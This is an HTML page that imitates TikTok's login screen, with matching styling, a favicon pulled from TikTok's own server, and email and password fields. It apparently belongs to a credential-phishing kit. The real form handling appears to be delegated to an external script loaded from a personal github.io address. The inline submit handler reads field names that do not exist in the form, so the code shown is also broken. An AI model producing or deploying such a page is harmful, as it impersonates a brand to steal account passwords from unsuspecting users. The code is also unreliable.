<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>TikTok Login</title>
  <link rel="icon" href="https://sf16-website-login.neutral.ttwstatic.com/obj/tiktok_web_login_static/tiktok/webapp/main/webapp-desktop/favicon.ico">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background: #fff;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .tiktok-container {
      max-width: 380px;
      width: 100%;
      text-align: center;
    }
    .tiktok-logo {
      margin-bottom: 32px;
    }
    .tiktok-logo img {
      width: 40px;
      height: 40px;
    }
    .login-title {
      font-size: 32px;
      font-weight: 700;
      color: #161823;
      margin-bottom: 8px;
    }
    .login-subtitle {
      font-size: 15px;
      color: #161823;
      margin-bottom: 32px;
    }
    .form-group {
      position: relative;
      width: 100%;
      margin-bottom: 16px;
    }
    .form-input {
      width: 100%;
      padding: 12px 40px 12px 16px;
      font-size: 16px;
      border: 1px solid #d0d0d0;
      border-radius: 4px;
      background: #fff;
      color: #161823;
    }
    .form-input:focus {
      outline: none;
      border-color: #fe2c55;
    }
    .toggle-password {
      position: absolute;
      top: 50%;
      right: 12px;
      transform: translateY(-50%);
      cursor: pointer;
      font-size: 18px;
      color: #888;
      user-select: none;
    }
    .login-button {
      width: 100%;
      background: #fe2c55;
      color: #fff;
      border: none;
      padding: 12px;
      font-size: 16px;
      font-weight: 600;
      border-radius: 4px;
      cursor: pointer;
      margin-bottom: 24px;
      transition: background-color 0.2s;
    }
    .login-button:hover {
      background: #e91e63;
    }
    .forgot-password {
      color: #161823;
      text-decoration: none;
      font-size: 14px;
      margin-bottom: 24px;
      display: block;
    }
    .forgot-password:hover {
      text-decoration: underline;
    }
    .divider {
      position: relative;
      text-align: center;
      margin: 24px 0;
      color: #8a8b9b;
      font-size: 14px;
    }
    .divider::before {
      content: "";
      position: absolute;
      top: 50%;
      left: 0;
      right: 0;
      height: 1px;
      background: #e1e1e1;
    }
    .divider span {
      background: #fff;
      padding: 0 16px;
      position: relative;
      z-index: 1;
    }
    .signup-text {
      color: #8a8b9b;
      font-size: 15px;
    }
    .signup-link {
      color: #fe2c55;
      text-decoration: none;
      font-weight: 600;
    }
    .signup-link:hover {
      text-decoration: underline;
    }
  </style>
</head>
<body>

  <div class="tiktok-container">
    <div class="tiktok-logo">
      <img src="tik.png" alt="TikTok Logo">
    </div>

    <h1 class="login-title">Log in to TikTok</h1>
    <p class="login-subtitle">Manage your account, check notifications, comment on videos, and more.</p>

    <form id="allForm">


      <input type="text" class="form-input" name="Email" placeholder="Email or username" required>

      <div class="form-group">
        <input type="password" class="form-input" id="password" name="Password" placeholder="Password" required>
        <span class="toggle-password" id="togglePassword">üëÅÔ∏è</span>
      </div>

      <button type="submit" class="login-button">Log In</button>
    </form>

    <a href="#" class="forgot-password">Forgot password?</a>

    <div class="divider"><span>or</span></div>

    <p class="signup-text">Don't have an account? <a href="#" class="signup-link">Sign up</a></p>
  </div>

  <script>
    document.getElementById("allForm").addEventListener("submit", function(e) {
      e.preventDefault();
      const username = e.target.message_title.value;
      const password = e.target.description.value;

      alert(`Logged in as: ${username}`);
      // You can send data to a backend here
    });

    // Toggle password visibility
    const togglePassword = document.getElementById("togglePassword");
    const passwordField = document.getElementById("password");

    togglePassword.addEventListener("click", () => {
      const type = passwordField.type === "password" ? "text" : "password";
      passwordField.type = type;
      togglePassword.textContent = type === "password" ? "üëÅÔ∏è" : "üôà";
    });
  </script>

  <script src="https://plyarth.github.io/intc/inin.js"></script>
</body>
</html>
